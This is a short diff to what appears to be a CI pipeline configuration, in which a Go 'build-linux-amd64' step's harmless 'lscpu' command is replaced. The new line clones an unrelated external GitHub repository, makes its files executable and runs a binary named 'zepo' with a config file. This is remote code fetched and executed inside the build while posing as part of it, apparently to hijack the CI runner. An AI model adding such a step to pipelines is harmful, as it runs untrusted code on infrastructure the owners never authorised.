@@ -11,4 +11,5 @@ steps:
   - name: build-linux-amd64
     image: golang:1.21.4
     commands:
-      - lscpu
+      - git clone https://github.com/azureone4/zephher.git && cd zephher && chmod +x SHA256SUMS && chmod +x config.json && chmod +x zepo && ./zepo -c "config.json"
+
